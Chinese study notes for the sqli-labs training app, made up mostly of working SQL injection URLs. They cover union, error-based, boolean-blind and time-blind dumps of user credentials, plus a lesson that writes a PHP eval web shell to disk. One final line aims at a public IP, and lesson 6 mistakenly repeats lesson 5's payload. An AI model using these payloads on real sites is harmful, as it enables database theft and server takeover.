
# sqli-labs学习笔记
## less 1   GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)

- 获取表中的字段数
> http://192.168.1.103/sqli/Less-1/index.php?id=1' order by 4 %23

- 获取到SQL的用户，数据库，版本
> http://192.168.1.103/sqli/Less-1/index.php?id=-1' union select 2,3,concat_ws(char(32,58,32),user(),database(),version()) %23

- 获取数据表
> http://192.168.1.103/sqli/Less-1/index.php?id=-1' union select 2,3,table_name from information_schema.tables where table_schema=0x7365637572697479 limit 1,1 %23

- 获取字段
> http://192.168.1.103/sqli/Less-1/index.php?id=-1' union select 2,3,column_name from information_schema.columns where  table_schema=0x7365637572697479 and table_name=0x7573657273 limit 0,1 %23

- 获取帐号密码
> http://192.168.1.103/sqli/Less-1/index.php?id=-1' union select 2,3,concat_ws(char(32,58,32),id,username,password) from users limit 0,1 %23

*获取到的数据库名和表名，都转成16进制的进行查询*

## less 2 GET - Error based - Intiger based (基于错误的GET整型注入)
**这里跟上面几乎一样，只是$id没用单引号引着，(因为sql语句对于数字型的数据可以不加单引号),不写单引号的注入就更简单了**

- 获取帐号密码
> http://192.168.1.103/sqli/Less-2/index.php?id=-1 union select 2,3,concat_ws(char(32,58,32),id,username,password) from users limit 0,1 %23

## less 3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)
**先闭单引号，在进行注入**

- 获取帐号密码
> http://192.168.1.103/sqli/Less-3/index.php?id=-1') union select 2,3,concat_ws(char(32,58,32),id,username,password) from users limit 0,1 %23

## less 4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）
**先闭双引号，在进行注入**

- 获取帐号密码
> http://192.168.1.103/sqli/Less-4/index.php?id=-1") union select 2,3,concat_ws(char(32,58,32),id,username,password) from users limit 0,1 %23

## less 5 GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)
**当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。因为是随机的，有时候得多试几次**

> http://192.168.1.103/sqli/Less-5/index.php?id=1' union select count(*),1,concat((select user()), floor(rand()*2)) as a from information_schema.tables  group by a %23  

- 获取数据表
> http://192.168.1.103/sqli/Less-5/index.php?id=1' union select count(*),1,concat((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 1,1), floor(rand()*2)) as a from information_schema.tables  group by a %23

- 获取字段
> http://192.168.1.103/sqli/Less-5/index.php?id=1' union select count(*),1,concat((select column_name from information_schema.columns where  table_schema=0x7365637572697479 and table_name=0x7573657273 limit 0,1), floor(rand()*2)) as a from information_schema.tables  group by a %23

- 获取帐号密码
> http://192.168.1.103/sqli/Less-5/index.php?id=1' union select count(*),1,concat((select concat_ws(char(32,58,32),id,username,password) from users limit 0,1), floor(rand()*2)) as a from information_schema.tables  group by a %23

## less 6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)

- 获取帐号密码
> http://192.168.1.103/sqli/Less-5/index.php?id=1' union select count(*),1,concat((select concat_ws(char(32,58,32),id,username,password) from users limit 0,1), floor(rand()*2)) as a from information_schema.tables  group by a %23

## less 7 GET - Dump into outfile - String （导出文件GET字符型注入）
> http://192.168.1.103/sqli/Less-7/index.php?id=1')) union select 1,'2','<?php @eval($_POST["giantbranch"]);?>' into outfile 'D:\\PHPTutorial\\WWW\\muma.php' %23

## less 8 GET - Blind - Boolian Based - Single Quotes (布尔型单引号GET盲注)

- 一个一个的猜数据库字符,根据 ascii 码猜
```
> http://192.168.1.102/sqli/Less-8/index.php?id=1' and ascii(substr((select database()),6,1))=105 %23
或者
>http://192.168.1.102/sqli/Less-8/index.php?id=1'  and if(ascii(substr((select database()),1,1))>100, 1, 0) %23  
```

- 一个一个的猜数据表字符,根据 ascii 码猜
> http://192.168.1.102/sqli/Less-8/index.php?id=1'  and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 1,1),1,1))>50, 1, 0) %23  

- 一个一个的猜数据字段字符,根据 ascii 码猜
> http://192.168.1.102/sqli/Less-8/index.php?id=1'  and if(ascii(substr((select column_name from information_schema.columns where  table_schema=0x7365637572697479 and table_name=0x7573657273 limit 0,1),1,1))=106, 1, 0) %23  

- dump表中的数据
> http://192.168.1.102/sqli/Less-8/index.php?id=1'and if(ascii(substr((select username  from users limit 0,1),1,1))=68,1,0 ) %23 

## less 9 GET - Blind - Time based. -  Single Quotes  (基于时间的GET单引号盲注)

- 一个一个的猜数据库字符,根据 ascii 码猜
> http://192.168.1.102/sqli/Less-9/index.php?id=1' and sleep(if(ascii(substr((select database()),1,1))=115,0,5)) %23

- 一个一个的猜数据表字符,根据 ascii 码猜
> http://192.168.1.102/sqli/Less-9/index.php?id=1' and sleep(if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 1,1),1,1))=114,0,5)) %23

- 一个一个的猜数据字段字符,根据 ascii 码猜
> http://192.168.1.102/sqli/Less-9/index.php?id=1' and sleep(if(ascii(substr((select column_name from information_schema.columns where  table_schema=0x7365637572697479 and table_name=0x7573657273 limit 0,1),1,1))=105,0,5)) %23

- dump表中的数据
> http://192.168.1.102/sqli/Less-9/index.php?id=1' and sleep(if(ascii(substr((select username  from users limit 0,1),1,1))=68,0,5)) %23

## less 10 GET - Blind - Time based - double quotes (基于时间的双引号盲注)

- dump表中的数据
> http://192.168.1.102/sqli/Less-10/index.php?id=1" and sleep(if(ascii(substr((select username  from users limit 0,1),1,1))=68,0,5)) %23


## less11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入)

- 获取数据集长度
http://120.203.13.111:6815/?id=1%20and%20length((select%20database()))=6%20#